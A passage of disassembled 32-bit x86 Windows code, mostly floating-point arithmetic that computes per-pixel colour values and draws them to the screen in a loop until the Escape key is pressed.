  402e29:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  402e2d:	f3 0f 11 4c 24 54    	movss  %xmm1,0x54(%esp)
  402e33:	f3 0f 11 44 24 0c    	movss  %xmm0,0xc(%esp)
  402e39:	0f 86 8b 00 00 00    	jbe    0x402eca
  402e3f:	f3 0f 10 05 c4 63 40 	movss  0x4063c4,%xmm0
  402e46:	00 
  402e47:	f3 0f 5c c2          	subss  %xmm2,%xmm0
  402e4b:	f3 0f 11 44 24 50    	movss  %xmm0,0x50(%esp)
  402e51:	ff 15 80 61 40 00    	call   *0x406180
  402e57:	99                   	cltd
  402e58:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
  402e5d:	f7 f9                	idiv   %ecx
  402e5f:	f3 0f 10 4c 24 50    	movss  0x50(%esp),%xmm1
  402e65:	f3 0f 58 c9          	addss  %xmm1,%xmm1
  402e69:	66 0f 6e c2          	movd   %edx,%xmm0
  402e6d:	0f 5b c0             	cvtdq2ps %xmm0,%xmm0
  402e70:	0f 2f c8             	comiss %xmm0,%xmm1
  402e73:	76 49                	jbe    0x402ebe
  402e75:	f3 0f 10 44 24 10    	movss  0x10(%esp),%xmm0
  402e7b:	f3 0f 59 05 44 64 40 	mulss  0x406444,%xmm0
  402e82:	00 
  402e83:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  402e87:	66 0f 6e cf          	movd   %edi,%xmm1
  402e8b:	0f 5b c9             	cvtdq2ps %xmm1,%xmm1
  402e8e:	f3 0f 58 c1          	addss  %xmm1,%xmm0
  402e92:	66 0f 6e c8          	movd   %eax,%xmm1
  402e96:	0f 5b c9             	cvtdq2ps %xmm1,%xmm1
  402e99:	f3 0f 58 c1          	addss  %xmm1,%xmm0
  402e9d:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  402ea0:	e8 97 2e 00 00       	call   0x405d3c
  402ea5:	0f 57 c9             	xorps  %xmm1,%xmm1
  402ea8:	f2 0f 5a c8          	cvtsd2ss %xmm0,%xmm1
  402eac:	f3 0f 59 0d b0 63 40 	mulss  0x4063b0,%xmm1
  402eb3:	00 
  402eb4:	f3 0f 58 0d b0 63 40 	addss  0x4063b0,%xmm1
  402ebb:	00 
  402ebc:	eb 06                	jmp    0x402ec4
  402ebe:	f3 0f 10 4c 24 54    	movss  0x54(%esp),%xmm1
  402ec4:	f3 0f 10 44 24 0c    	movss  0xc(%esp),%xmm0
  402eca:	f3 0f 10 64 24 28    	movss  0x28(%esp),%xmm4
  402ed0:	f3 0f 10 15 a8 63 40 	movss  0x4063a8,%xmm2
  402ed7:	00 
  402ed8:	0f 28 dc             	movaps %xmm4,%xmm3
  402edb:	f3 0f 59 05 ac 63 40 	mulss  0x4063ac,%xmm0
  402ee2:	00 
  402ee3:	f3 0f 59 da          	mulss  %xmm2,%xmm3
  402ee7:	f3 0f 10 3d a0 63 40 	movss  0x4063a0,%xmm7
  402eee:	00 
  402eef:	f3 0f 10 2d c4 63 40 	movss  0x4063c4,%xmm5
  402ef6:	00 
  402ef7:	f3 0f 58 da          	addss  %xmm2,%xmm3
  402efb:	0f 28 d5             	movaps %xmm5,%xmm2
  402efe:	f3 0f 58 d8          	addss  %xmm0,%xmm3
  402f02:	0f 5a c4             	cvtps2pd %xmm4,%xmm0
  402f05:	0f 54 05 80 64 40 00 	andps  0x406480,%xmm0
  402f0c:	66 0f 5a e0          	cvtpd2ps %xmm0,%xmm4
  402f10:	0f 28 c1             	movaps %xmm1,%xmm0
  402f13:	f3 0f 59 0d ac 63 40 	mulss  0x4063ac,%xmm1
  402f1a:	00 
  402f1b:	f3 0f 59 25 b0 63 40 	mulss  0x4063b0,%xmm4
  402f22:	00 
  402f23:	f3 0f 59 05 b8 63 40 	mulss  0x4063b8,%xmm0
  402f2a:	00 
  402f2b:	f3 0f 58 e7          	addss  %xmm7,%xmm4
  402f2f:	f3 0f 58 e0          	addss  %xmm0,%xmm4
  402f33:	f3 0f 10 44 24 08    	movss  0x8(%esp),%xmm0
  402f39:	f3 0f 5c d0          	subss  %xmm0,%xmm2
  402f3d:	f3 0f 11 64 24 0c    	movss  %xmm4,0xc(%esp)
  402f43:	f3 0f 59 15 b4 63 40 	mulss  0x4063b4,%xmm2
  402f4a:	00 
  402f4b:	f3 0f 58 15 b0 63 40 	addss  0x4063b0,%xmm2
  402f52:	00 
  402f53:	f3 0f 58 d1          	addss  %xmm1,%xmm2
  402f57:	f3 0f 10 0d a4 63 40 	movss  0x4063a4,%xmm1
  402f5e:	00 
  402f5f:	0f 2f c8             	comiss %xmm0,%xmm1
  402f62:	f3 0f 11 54 24 08    	movss  %xmm2,0x8(%esp)
  402f68:	76 53                	jbe    0x402fbd
  402f6a:	f3 0f 5c c8          	subss  %xmm0,%xmm1
  402f6e:	f3 0f 59 0d 38 64 40 	mulss  0x406438,%xmm1
  402f75:	00 
  402f76:	0f 28 c1             	movaps %xmm1,%xmm0
  402f79:	f3 0f 59 05 bc 63 40 	mulss  0x4063bc,%xmm0
  402f80:	00 
  402f81:	f3 0f 58 c3          	addss  %xmm3,%xmm0
  402f85:	0f 28 dd             	movaps %xmm5,%xmm3
  402f88:	f3 0f 5d d8          	minss  %xmm0,%xmm3
  402f8c:	0f 28 c1             	movaps %xmm1,%xmm0
  402f8f:	f3 0f 59 05 a8 63 40 	mulss  0x4063a8,%xmm0
  402f96:	00 
  402f97:	f3 0f 59 cf          	mulss  %xmm7,%xmm1
  402f9b:	f3 0f 58 c4          	addss  %xmm4,%xmm0
  402f9f:	0f 28 e5             	movaps %xmm5,%xmm4
  402fa2:	f3 0f 58 ca          	addss  %xmm2,%xmm1
  402fa6:	f3 0f 5d e0          	minss  %xmm0,%xmm4
  402faa:	0f 28 c5             	movaps %xmm5,%xmm0
  402fad:	f3 0f 5d c1          	minss  %xmm1,%xmm0
  402fb1:	f3 0f 11 64 24 0c    	movss  %xmm4,0xc(%esp)
  402fb7:	f3 0f 11 44 24 08    	movss  %xmm0,0x8(%esp)
  402fbd:	f2 0f 10 0d 08 64 40 	movsd  0x406408,%xmm1
  402fc4:	00 
  402fc5:	0f 5a c3             	cvtps2pd %xmm3,%xmm0
  402fc8:	e8 69 2d 00 00       	call   0x405d36
  402fcd:	8b 44 24 18          	mov    0x18(%esp),%eax
  402fd1:	f2 0f 10 0d f8 63 40 	movsd  0x4063f8,%xmm1
  402fd8:	00 
  402fd9:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  402fdd:	f3 0f 59 05 60 64 40 	mulss  0x406460,%xmm0
  402fe4:	00 
  402fe5:	f3 0f 2c c8          	cvttss2si %xmm0,%ecx
  402fe9:	f3 0f 10 44 24 0c    	movss  0xc(%esp),%xmm0
  402fef:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  402ff2:	88 4c 06 02          	mov    %cl,0x2(%esi,%eax,1)
  402ff6:	e8 3b 2d 00 00       	call   0x405d36
  402ffb:	8b 44 24 18          	mov    0x18(%esp),%eax
  402fff:	f2 0f 10 0d e8 63 40 	movsd  0x4063e8,%xmm1
  403006:	00 
  403007:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  40300b:	f3 0f 59 05 60 64 40 	mulss  0x406460,%xmm0
  403012:	00 
  403013:	f3 0f 2c c8          	cvttss2si %xmm0,%ecx
  403017:	f3 0f 10 44 24 08    	movss  0x8(%esp),%xmm0
  40301d:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  403020:	88 4c 06 01          	mov    %cl,0x1(%esi,%eax,1)
  403024:	e8 0d 2d 00 00       	call   0x405d36
  403029:	8b 44 24 18          	mov    0x18(%esp),%eax
  40302d:	47                   	inc    %edi
  40302e:	f3 0f 10 54 24 58    	movss  0x58(%esp),%xmm2
  403034:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  403038:	f3 0f 59 05 60 64 40 	mulss  0x406460,%xmm0
  40303f:	00 
  403040:	f3 0f 2c c8          	cvttss2si %xmm0,%ecx
  403044:	f3 0f 10 05 c4 63 40 	movss  0x4063c4,%xmm0
  40304b:	00 
  40304c:	88 0c 06             	mov    %cl,(%esi,%eax,1)
  40304f:	83 c6 04             	add    $0x4,%esi
  403052:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  403056:	3b f9                	cmp    %ecx,%edi
  403058:	0f 8c d2 fc ff ff    	jl     0x402d30
  40305e:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  403062:	8b 54 24 34          	mov    0x34(%esp),%edx
  403066:	8b 74 24 5c          	mov    0x5c(%esp),%esi
  40306a:	40                   	inc    %eax
  40306b:	8d 3c 8d 00 00 00 00 	lea    0x0(,%ecx,4),%edi
  403072:	03 d7                	add    %edi,%edx
  403074:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  403078:	89 54 24 34          	mov    %edx,0x34(%esp)
  40307c:	3b c6                	cmp    %esi,%eax
  40307e:	0f 8c 3c fc ff ff    	jl     0x402cc0
  403084:	8b 7c 24 20          	mov    0x20(%esp),%edi
  403088:	ff 15 80 61 40 00    	call   *0x406180
  40308e:	99                   	cltd
  40308f:	b9 64 00 00 00       	mov    $0x64,%ecx
  403094:	f7 f9                	idiv   %ecx
  403096:	68 20 00 cc 00       	push   $0xcc0020
  40309b:	6a 00                	push   $0x0
  40309d:	6a 00                	push   $0x0
  40309f:	ff 74 24 30          	push   0x30(%esp)
  4030a3:	56                   	push   %esi
  4030a4:	57                   	push   %edi
  4030a5:	83 fa 1e             	cmp    $0x1e,%edx
  4030a8:	7d 50                	jge    0x4030fa
  4030aa:	f3 0f 10 44 24 28    	movss  0x28(%esp),%xmm0
  4030b0:	f3 0f 59 05 cc 63 40 	mulss  0x4063cc,%xmm0
  4030b7:	00 
  4030b8:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  4030bb:	e8 70 2c 00 00       	call   0x405d30
  4030c0:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  4030c4:	f3 0f 59 05 2c 64 40 	mulss  0x40642c,%xmm0
  4030cb:	00 
  4030cc:	f3 0f 2c c0          	cvttss2si %xmm0,%eax
  4030d0:	f3 0f 10 44 24 28    	movss  0x28(%esp),%xmm0
  4030d6:	f3 0f 59 05 d8 63 40 	mulss  0x4063d8,%xmm0
  4030dd:	00 
  4030de:	50                   	push   %eax
  4030df:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  4030e2:	e8 55 2c 00 00       	call   0x405d3c
  4030e7:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  4030eb:	f3 0f 59 05 38 64 40 	mulss  0x406438,%xmm0
  4030f2:	00 
  4030f3:	f3 0f 2c c0          	cvttss2si %xmm0,%eax
  4030f7:	50                   	push   %eax
  4030f8:	eb 04                	jmp    0x4030fe
  4030fa:	6a 00                	push   $0x0
  4030fc:	6a 00                	push   $0x0
  4030fe:	ff 74 24 34          	push   0x34(%esp)
  403102:	ff 15 20 60 40 00    	call   *0x406020
  403108:	ff 74 24 24          	push   0x24(%esp)
  40310c:	ff 15 10 60 40 00    	call   *0x406010
  403112:	6a 10                	push   $0x10
  403114:	ff 15 64 60 40 00    	call   *0x406064
  40311a:	6a 1b                	push   $0x1b
  40311c:	ff 15 c8 60 40 00    	call   *0x4060c8
  403122:	66 85 c0             	test   %ax,%ax
  403125:	0f 84 25 fb ff ff    	je     0x402c50
  40312b:	ff 74 24 38          	push   0x38(%esp)
  40312f:	ff 15 18 60 40 00    	call   *0x406018
  403135:	ff 74 24 14          	push   0x14(%esp)
  403139:	6a 00                	push   $0x0
  40313b:	ff 15 b0 60 40 00    	call   *0x4060b0
  403141:	8b 8c 24 8c 00 00 00 	mov    0x8c(%esp),%ecx
  403148:	33 c0                	xor    %eax,%eax
  40314a:	5f                   	pop    %edi
  40314b:	5e                   	pop    %esi
  40314c:	33 cc                	xor    %esp,%ecx
  40314e:	e8 71 1d 00 00       	call   0x404ec4
  403153:	8b e5                	mov    %ebp,%esp
  403155:	5d                   	pop    %ebp
  403156:	c2 04 00             	ret    $0x4
  403159:	cc                   	int3
  40315a:	cc                   	int3
  40315b:	cc                   	int3
  40315c:	cc                   	int3
  40315d:	cc                   	int3
  40315e:	cc                   	int3
  40315f:	cc                   	int3
  403160:	55                   	push   %ebp
  403161:	8b ec                	mov    %esp,%ebp
  403163:	83 e4 f8             	and    $0xfffffff8,%esp
  403166:	81 ec 98 00 00 00    	sub    $0x98,%esp
  40316c:	a1 08 80 40 00       	mov    0x408008,%eax
  403171:	33 c4                	xor    %esp,%eax
  403173:	89 84 24 94 00 00 00 	mov    %eax,0x94(%esp)
  40317a:	56                   	push   %esi
  40317b:	57                   	push   %edi
  40317c:	6a 00                	push   $0x0
  40317e:	ff 15 b8 60 40 00    	call   *0x4060b8
  403184:	8b 35 c0 60 40 00    	mov    0x4060c0,%esi
  40318a:	6a 00                	push   $0x0
  40318c:	89 44 24 48          	mov    %eax,0x48(%esp)
  403190:	ff d6                	call   *%esi
  403192:	6a 01                	push   $0x1
  403194:	89 44 24 10          	mov    %eax,0x10(%esp)
  403198:	ff d6                	call   *%esi
  40319a:	8b 74 24 0c          	mov    0xc(%esp),%esi
  40319e:	8b f8                	mov    %eax,%edi
  4031a0:	6a 00                	push   $0x0
  4031a2:	6a 00                	push   $0x0
  4031a4:	8d 44 24 34          	lea    0x34(%esp),%eax
  4031a8:	89 7c 24 48          	mov    %edi,0x48(%esp)
  4031ac:	50                   	push   %eax
  4031ad:	6a 00                	push   $0x0
  4031af:	8d 84 24 80 00 00 00 	lea    0x80(%esp),%eax
  4031b6:	c7 84 24 80 00 00 00 	movl   $0x28,0x80(%esp)
  4031bd:	28 00 00 00 
  4031c1:	50                   	push   %eax
  4031c2:	ff 74 24 58          	push   0x58(%esp)
  4031c6:	0f 57 c0             	xorps  %xmm0,%xmm0
  4031c9:	89 b4 24 8c 00 00 00 	mov    %esi,0x8c(%esp)
  4031d0:	89 bc 24 90 00 00 00 	mov    %edi,0x90(%esp)
  4031d7:	c7 84 24 94 00 00 00 	movl   $0x200001,0x94(%esp)
  4031de:	01 00 20 00 
  4031e2:	c7 84 24 98 00 00 00 	movl   $0x0,0x98(%esp)
  4031e9:	00 00 00 00 
  4031ed:	0f 11 84 24 9c 00 00 	movups %xmm0,0x9c(%esp)
  4031f4:	00 
  4031f5:	66 0f d6 84 24 ac 00 	movq   %xmm0,0xac(%esp)
  4031fc:	00 00 
  4031fe:	ff 15 04 60 40 00    	call   *0x406004
  403204:	0f 57 c0             	xorps  %xmm0,%xmm0
  403207:	89 44 24 5c          	mov    %eax,0x5c(%esp)
  40320b:	6a 1b                	push   $0x1b
  40320d:	f3 0f 11 44 24 18    	movss  %xmm0,0x18(%esp)
  403213:	ff 15 c8 60 40 00    	call   *0x4060c8
  403219:	66 85 c0             	test   %ax,%ax
  40321c:	0f 85 81 06 00 00    	jne    0x4038a3
  403222:	ff 74 24 44          	push   0x44(%esp)
  403226:	ff 15 08 60 40 00    	call   *0x406008
  40322c:	ff 74 24 5c          	push   0x5c(%esp)
  403230:	89 44 24 70          	mov    %eax,0x70(%esp)
  403234:	50                   	push   %eax
  403235:	ff 15 00 60 40 00    	call   *0x406000
  40323b:	f3 0f 10 44 24 14    	movss  0x14(%esp),%xmm0
  403241:	f3 0f 58 05 9c 63 40 	addss  0x40639c,%xmm0
  403248:	00 
  403249:	f3 0f 11 44 24 14    	movss  %xmm0,0x14(%esp)
  40324f:	f3 0f 59 05 a8 63 40 	mulss  0x4063a8,%xmm0
  403256:	00 
  403257:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  40325a:	e8 dd 2a 00 00       	call   0x405d3c
  40325f:	f3 0f 10 54 24 14    	movss  0x14(%esp),%xmm2
  403265:	0f 57 c9             	xorps  %xmm1,%xmm1
  403268:	f2 0f 5a c8          	cvtsd2ss %xmm0,%xmm1
  40326c:	33 c0                	xor    %eax,%eax
  40326e:	89 44 24 34          	mov    %eax,0x34(%esp)
  403272:	0f 28 c2             	movaps %xmm2,%xmm0
  403275:	f3 0f 59 0d 4c 64 40 	mulss  0x40644c,%xmm1
  40327c:	00 
  40327d:	f3 0f 59 05 a0 63 40 	mulss  0x4063a0,%xmm0
  403284:	00 
  403285:	f3 0f 58 0d 50 64 40 	addss  0x406450,%xmm1
  40328c:	00 
  40328d:	f3 0f 11 44 24 50    	movss  %xmm0,0x50(%esp)
  403293:	f3 0f 11 4c 24 30    	movss  %xmm1,0x30(%esp)
  403299:	85 ff                	test   %edi,%edi
  40329b:	0f 8e dc 03 00 00    	jle    0x40367d
  4032a1:	33 c9                	xor    %ecx,%ecx
  4032a3:	8d 14 b5 00 00 00 00 	lea    0x0(,%esi,4),%edx
  4032aa:	89 4c 24 1c          	mov    %ecx,0x1c(%esp)
  4032ae:	89 54 24 58          	mov    %edx,0x58(%esp)
  4032b2:	33 ff                	xor    %edi,%edi
  4032b4:	85 f6                	test   %esi,%esi
  4032b6:	0f 8e aa 03 00 00    	jle    0x403666
  4032bc:	66 0f 6e c0          	movd   %eax,%xmm0
  4032c0:	0f 5b c0             	cvtdq2ps %xmm0,%xmm0
  4032c3:	f3 0f 5e c1          	divss  %xmm1,%xmm0
  4032c7:	0f 28 c8             	movaps %xmm0,%xmm1
  4032ca:	f3 0f 11 44 24 48    	movss  %xmm0,0x48(%esp)
  4032d0:	f3 0f 59 c8          	mulss  %xmm0,%xmm1
  4032d4:	f3 0f 11 4c 24 60    	movss  %xmm1,0x60(%esp)
  4032da:	0f 28 ca             	movaps %xmm2,%xmm1
  4032dd:	f3 0f 58 ca          	addss  %xmm2,%xmm1
  4032e1:	f3 0f 11 4c 24 64    	movss  %xmm1,0x64(%esp)
  4032e7:	0f 28 c8             	movaps %xmm0,%xmm1
  4032ea:	f3 0f 59 0d 30 64 40 	mulss  0x406430,%xmm1
  4032f1:	00 
  4032f2:	0f 28 c2             	movaps %xmm2,%xmm0
  4032f5:	f3 0f 59 05 b8 63 40 	mulss  0x4063b8,%xmm0
  4032fc:	00 
  4032fd:	f3 0f 59 0d d4 63 40 	mulss  0x4063d4,%xmm1
  403304:	00 
  403305:	f3 0f 58 c8          	addss  %xmm0,%xmm1
  403309:	0f 5a c1             	cvtps2pd %xmm1,%xmm0
  40330c:	e8 1f 2a 00 00       	call   0x405d30
  403311:	8b 74 24 1c          	mov    0x1c(%esp),%esi
  403315:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  403319:	f3 0f 11 44 24 68    	movss  %xmm0,0x68(%esp)
  40331f:	f3 0f 10 44 24 14    	movss  0x14(%esp),%xmm0
  403325:	f3 0f 59 05 a4 63 40 	mulss  0x4063a4,%xmm0
  40332c:	00 
  40332d:	f3 0f 11 44 24 54    	movss  %xmm0,0x54(%esp)
  403333:	66 0f 6e cf          	movd   %edi,%xmm1
  403337:	0f 5b c9             	cvtdq2ps %xmm1,%xmm1
  40333a:	f3 0f 5e 4c 24 30    	divss  0x30(%esp),%xmm1
  403340:	0f 28 c1             	movaps %xmm1,%xmm0
  403343:	f3 0f 11 4c 24 10    	movss  %xmm1,0x10(%esp)
  403349:	f3 0f 59 c1          	mulss  %xmm1,%xmm0
  40334d:	f3 0f 58 44 24 60    	addss  0x60(%esp),%xmm0
  403353:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  403356:	e8 e7 29 00 00       	call   0x405d42
  40335b:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  40335f:	f3 0f 59 05 a8 63 40 	mulss  0x4063a8,%xmm0
  403366:	00 
  403367:	f3 0f 58 44 24 64    	addss  0x64(%esp),%xmm0
  40336d:	f3 0f 5a c0          	cvtss2sd %xmm0,%xmm0
  403371:	e8 c6 29 00 00       	call   0x405d3c
  403376:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  40337a:	f3 0f 59 05 b0 63 40 	mulss  0x4063b0,%xmm0
  403381:	00 
  403382:	f3 0f 58 05 b0 63 40 	addss  0x4063b0,%xmm0
  403389:	00 
  40338a:	f3 0f 11 44 24 18    	movss  %xmm0,0x18(%esp)
  403390:	f3 0f 10 44 24 10    	movss  0x10(%esp),%xmm0
  403396:	f3 0f 59 05 30 64 40 	mulss  0x406430,%xmm0
  40339d:	00 
  40339e:	f3 0f 58 44 24 14    	addss  0x14(%esp),%xmm0
  4033a4:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  4033a7:	e8 90 29 00 00       	call   0x405d3c
  4033ac:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  4033b0:	f3 0f 59 44 24 68    	mulss  0x68(%esp),%xmm0
  4033b6:	f3 0f 59 05 30 64 40 	mulss  0x406430,%xmm0
  4033bd:	00 
  4033be:	f3 0f 58 44 24 50    	addss  0x50(%esp),%xmm0
  4033c4:	f3 0f 11 44 24 38    	movss  %xmm0,0x38(%esp)
  4033ca:	f3 0f 5a c0          	cvtss2sd %xmm0,%xmm0
  4033ce:	e8 69 29 00 00       	call   0x405d3c
  4033d3:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  4033d7:	f2 0f 10 0d e0 63 40 	movsd  0x4063e0,%xmm1
  4033de:	00 
  4033df:	f3 0f 59 44 24 18    	mulss  0x18(%esp),%xmm0
  4033e5:	f3 0f 5a c0          	cvtss2sd %xmm0,%xmm0
  4033e9:	0f 54 05 80 64 40 00 	andps  0x406480,%xmm0
  4033f0:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  4033f4:	f3 0f 5a c0          	cvtss2sd %xmm0,%xmm0
  4033f8:	e8 39 29 00 00       	call   0x405d36
  4033fd:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  403401:	f3 0f 11 44 24 4c    	movss  %xmm0,0x4c(%esp)
  403407:	f3 0f 10 44 24 48    	movss  0x48(%esp),%xmm0
  40340d:	f3 0f 58 44 24 10    	addss  0x10(%esp),%xmm0
  403413:	f3 0f 58 44 24 54    	addss  0x54(%esp),%xmm0
  403419:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  40341c:	f2 0f 11 44 24 20    	movsd  %xmm0,0x20(%esp)
  403422:	dd 44 24 20          	fldl   0x20(%esp)
  403426:	d9 e8                	fld1
  403428:	e8 f7 28 00 00       	call   0x405d24
  40342d:	dd 5c 24 20          	fstpl  0x20(%esp)
  403431:	f2 0f 10 44 24 20    	movsd  0x20(%esp),%xmm0
  403437:	66 0f 5a c0          	cvtpd2ps %xmm0,%xmm0
  40343b:	f3 0f 5c 05 b0 63 40 	subss  0x4063b0,%xmm0
  403442:	00 
  403443:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  403446:	0f 54 05 80 64 40 00 	andps  0x406480,%xmm0
  40344d:	66 0f 5a c0          	cvtpd2ps %xmm0,%xmm0
  403451:	f3 0f 11 44 24 20    	movss  %xmm0,0x20(%esp)
  403457:	f3 0f 10 44 24 38    	movss  0x38(%esp),%xmm0
  40345d:	f3 0f 58 05 18 64 40 	addss  0x406418,%xmm0
  403464:	00 
  403465:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  403468:	e8 cf 28 00 00       	call   0x405d3c
  40346d:	f3 0f 10 4c 24 20    	movss  0x20(%esp),%xmm1
  403473:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  403477:	f3 0f 58 c9          	addss  %xmm1,%xmm1
  40347b:	f3 0f 59 44 24 18    	mulss  0x18(%esp),%xmm0
  403481:	f3 0f 59 c1          	mulss  %xmm1,%xmm0
  403485:	f2 0f 10 0d e0 63 40 	movsd  0x4063e0,%xmm1
  40348c:	00 
  40348d:	f3 0f 5a c0          	cvtss2sd %xmm0,%xmm0
  403491:	0f 54 05 80 64 40 00 	andps  0x406480,%xmm0
  403498:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  40349c:	f3 0f 5a c0          	cvtss2sd %xmm0,%xmm0
  4034a0:	e8 91 28 00 00       	call   0x405d36
  4034a5:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  4034a9:	f3 0f 11 44 24 20    	movss  %xmm0,0x20(%esp)
  4034af:	f3 0f 10 44 24 38    	movss  0x38(%esp),%xmm0
  4034b5:	f3 0f 58 05 34 64 40 	addss  0x406434,%xmm0
  4034bc:	00 
  4034bd:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  4034c0:	e8 77 28 00 00       	call   0x405d3c
  4034c5:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  4034c9:	f3 0f 59 44 24 18    	mulss  0x18(%esp),%xmm0
  4034cf:	f3 0f 5a c0          	cvtss2sd %xmm0,%xmm0
  4034d3:	0f 54 05 80 64 40 00 	andps  0x406480,%xmm0
  4034da:	f2 0f 10 0d e0 63 40 	movsd  0x4063e0,%xmm1
  4034e1:	00 
  4034e2:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  4034e6:	f3 0f 5a c0          	cvtss2sd %xmm0,%xmm0
  4034ea:	e8 47 28 00 00       	call   0x405d36
  4034ef:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  4034f3:	f3 0f 11 44 24 18    	movss  %xmm0,0x18(%esp)
  4034f9:	f3 0f 10 44 24 10    	movss  0x10(%esp),%xmm0
  4034ff:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  403502:	f2 0f 11 44 24 38    	movsd  %xmm0,0x38(%esp)
  403508:	dd 44 24 38          	fldl   0x38(%esp)
  40350c:	d9 e8                	fld1
  40350e:	e8 11 28 00 00       	call   0x405d24
  403513:	f3 0f 10 0d a0 63 40 	movss  0x4063a0,%xmm1
  40351a:	00 
  40351b:	dd 5c 24 38          	fstpl  0x38(%esp)
  40351f:	f2 0f 10 44 24 38    	movsd  0x38(%esp),%xmm0
  403525:	66 0f 5a c0          	cvtpd2ps %xmm0,%xmm0
  403529:	0f 2f c8             	comiss %xmm0,%xmm1
  40352c:	0f 86 c1 00 00 00    	jbe    0x4035f3
  403532:	f3 0f 10 44 24 48    	movss  0x48(%esp),%xmm0
  403538:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  40353b:	f2 0f 11 44 24 38    	movsd  %xmm0,0x38(%esp)
  403541:	dd 44 24 38          	fldl   0x38(%esp)
  403545:	d9 e8                	fld1
  403547:	e8 d8 27 00 00       	call   0x405d24
  40354c:	f3 0f 10 0d a0 63 40 	movss  0x4063a0,%xmm1
  403553:	00 
  403554:	dd 5c 24 38          	fstpl  0x38(%esp)
  403558:	f2 0f 10 44 24 38    	movsd  0x38(%esp),%xmm0
  40355e:	66 0f 5a c0          	cvtpd2ps %xmm0,%xmm0
  403562:	0f 2f c8             	comiss %xmm0,%xmm1
  403565:	0f 86 88 00 00 00    	jbe    0x4035f3
  40356b:	f3 0f 10 4c 24 48    	movss  0x48(%esp),%xmm1
  403571:	f3 0f 10 44 24 14    	movss  0x14(%esp),%xmm0
  403577:	f3 0f 59 05 2c 64 40 	mulss  0x40642c,%xmm0
  40357e:	00 
  40357f:	f3 0f 59 4c 24 10    	mulss  0x10(%esp),%xmm1
  403585:	f3 0f 58 c8          	addss  %xmm0,%xmm1
  403589:	0f 5a c1             	cvtps2pd %xmm1,%xmm0
  40358c:	e8 ab 27 00 00       	call   0x405d3c
  403591:	f3 0f 10 1d b0 63 40 	movss  0x4063b0,%xmm3
  403598:	00 
  403599:	0f 57 c9             	xorps  %xmm1,%xmm1
  40359c:	f2 0f 5a c8          	cvtsd2ss %xmm0,%xmm1
  4035a0:	f3 0f 10 25 c4 63 40 	movss  0x4063c4,%xmm4
  4035a7:	00 
  4035a8:	f3 0f 59 cb          	mulss  %xmm3,%xmm1
  4035ac:	0f 28 d4             	movaps %xmm4,%xmm2
  4035af:	f3 0f 58 cb          	addss  %xmm3,%xmm1
  4035b3:	0f 28 c1             	movaps %xmm1,%xmm0
  4035b6:	f3 0f 59 05 b8 63 40 	mulss  0x4063b8,%xmm0
  4035bd:	00 
  4035be:	f3 0f 58 44 24 4c    	addss  0x4c(%esp),%xmm0
  4035c4:	f3 0f 5d d0          	minss  %xmm0,%xmm2
  4035c8:	0f 28 c1             	movaps %xmm1,%xmm0
  4035cb:	f3 0f 59 0d a8 63 40 	mulss  0x4063a8,%xmm1
  4035d2:	00 
  4035d3:	f3 0f 59 c3          	mulss  %xmm3,%xmm0
  4035d7:	0f 28 dc             	movaps %xmm4,%xmm3
  4035da:	f3 0f 58 4c 24 18    	addss  0x18(%esp),%xmm1
  4035e0:	f3 0f 58 44 24 20    	addss  0x20(%esp),%xmm0
  4035e6:	f3 0f 5d d8          	minss  %xmm0,%xmm3
  4035ea:	0f 28 c4             	movaps %xmm4,%xmm0
  4035ed:	f3 0f 5d c1          	minss  %xmm1,%xmm0
  4035f1:	eb 12                	jmp    0x403605
  4035f3:	f3 0f 10 44 24 18    	movss  0x18(%esp),%xmm0
  4035f9:	f3 0f 10 5c 24 20    	movss  0x20(%esp),%xmm3
  4035ff:	f3 0f 10 54 24 4c    	movss  0x4c(%esp),%xmm2
  403605:	f3 0f 10 0d 60 64 40 	movss  0x406460,%xmm1
  40360c:	00 
  40360d:	47                   	inc    %edi
  40360e:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403612:	f3 0f 59 d1          	mulss  %xmm1,%xmm2
  403616:	f3 0f 59 d9          	mulss  %xmm1,%xmm3
  40361a:	f3 0f 2c ca          	cvttss2si %xmm2,%ecx
  40361e:	f3 0f 59 c1          	mulss  %xmm1,%xmm0
  403622:	88 4c 06 02          	mov    %cl,0x2(%esi,%eax,1)
  403626:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  40362a:	f3 0f 2c cb          	cvttss2si %xmm3,%ecx
  40362e:	88 4c 06 01          	mov    %cl,0x1(%esi,%eax,1)
